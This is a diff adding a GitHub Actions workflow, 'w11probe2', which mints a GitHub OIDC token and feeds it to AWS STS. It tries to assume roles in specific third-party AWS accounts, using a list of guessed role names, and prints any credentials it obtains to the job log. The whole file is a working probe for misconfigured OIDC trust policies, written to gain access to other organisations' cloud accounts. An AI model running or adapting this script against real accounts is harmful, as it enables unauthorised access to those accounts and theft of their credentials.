@@ -1,0 +1,44 @@
+name: w11probe2
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: mint and probe
+        run: |
+          set -euo pipefail
+          TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "$TOKEN" > /tmp/t.jwt
+          python3 - <<'PY'
+          import urllib.parse, urllib.request, urllib.error, time, json
+          t = open('/tmp/t.jwt').read().strip()
+          def sts(arn, dur, label):
+              data=urllib.parse.urlencode({
+                  'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15',
+                  'RoleArn':arn,'RoleSessionName':'w11b09','DurationSeconds':str(dur),
+                  'WebIdentityToken':t}).encode()
+              req=urllib.request.Request('https://sts.amazonaws.com/', data=data, method='POST',
+                  headers={'Content-Type':'application/x-www-form-urlencoded','User-Agent':'w11b09'})
+              try:
+                  with urllib.request.urlopen(req, timeout=10) as r:
+                      body=r.read().decode('utf-8','replace'); code=r.status
+              except urllib.error.HTTPError as e:
+                  body=e.read().decode('utf-8','replace'); code=e.code
+              import re
+              m=re.search(r'<Code>([^<]+)</Code>', body)
+              msg=re.search(r'<Message>([^<]+)</Message>', body)
+              print(f'ARM|{label}|{code}|{len(body)}|{m.group(1) if m else "-"}|{(msg.group(1) if msg else "-")[:160]}')
+              if code==200: print('CREDS', body[:500])
+              time.sleep(0.5)
+          sts('arn:aws:iam::220898748818:role/w11b09-does-not-exist',3600,'E_zyga_missing')
+          sts('arn:aws:iam::227010423725:role/w11b09-does-not-exist',3600,'F_candy_missing')
+          sts('arn:aws:iam::015428540659:role/w11b09-does-not-exist',3600,'G_other_missing')
+          sts('arn:aws:iam::bonk:role/vercel-oidc',3600,'H_alias_vercel_oidc')
+          sts('arn:aws:iam::bonk:role/GitHubActions',3600,'I_alias_githubactions')
+          for name in ['zyga-swap-api','zyga-swap','GitHubActions','github-actions','deployment','DeploymentRole','ApiRole','ecsTaskExecutionRole','zyga-swap-web','zyga-swap-proof-worker']:
+              sts(f'arn:aws:iam::220898748818:role/{name}',3600,'J_zyga_'+name)
+          PY
